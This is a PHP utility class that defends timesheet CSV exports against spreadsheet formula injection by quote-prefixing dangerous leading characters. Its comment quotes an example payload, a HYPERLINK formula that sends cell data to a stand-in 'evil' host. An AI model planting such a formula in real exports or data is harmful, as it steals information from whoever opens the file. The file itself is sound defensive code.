<?php

namespace App\Support;

/**
 * Defuses CSV formula injection ("CSV injection" / "Excel macro injection")
 * in the timesheet/hours exports: project names, ticket names, comments,
 * user names and even ticket codes (a project's ticket_prefix is only
 * length-checked, not restricted to safe characters) can all hold
 * attacker-influenced text. A cell that opens with =, +, -, @, a tab or a
 * carriage return is read as a formula by Excel/LibreOffice/Google Sheets
 * once the CSV is opened - e.g. a ticket named
 * =HYPERLINK("http://evil/?d="&A1) exfiltrates data from whoever opens the
 * export, on their machine, outside this application entirely.
 *
 * Prefixing such a value with a single quote is the standard mitigation
 * (OWASP's CSV Injection cheat sheet): every affected spreadsheet application
 * strips a leading apostrophe and renders the rest as plain text instead of
 * evaluating it.
 */
class CsvSanitizer
{
    private const DANGEROUS_PREFIXES = ['=', '+', '-', '@', "\t", "\r"];

    /**
     * A single cell value, safe to place in an exported row.
     */
    public static function cell(mixed $value): mixed
    {
        if (! is_string($value) || $value === '') {
            return $value;
        }

        foreach (self::DANGEROUS_PREFIXES as $prefix) {
            if (str_starts_with($value, $prefix)) {
                return "'".$value;
            }
        }

        return $value;
    }

    /**
     * Every value in an export row, in one pass.
     *
     * @param  array<string, mixed>  $row
     * @return array<string, mixed>
     */
    public static function row(array $row): array
    {
        return array_map(self::cell(...), $row);
    }
}
